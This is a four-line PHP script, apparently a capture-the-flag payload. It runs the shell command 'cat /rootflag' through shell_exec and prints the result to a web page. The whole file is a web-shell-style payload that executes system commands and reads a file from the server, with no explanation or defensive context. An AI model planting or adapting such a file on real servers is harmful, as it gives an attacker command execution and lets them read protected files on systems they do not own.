<?php
$output = shell_exec('cat /rootflag 2>&1');
echo "<pre>$output</pre>";
?>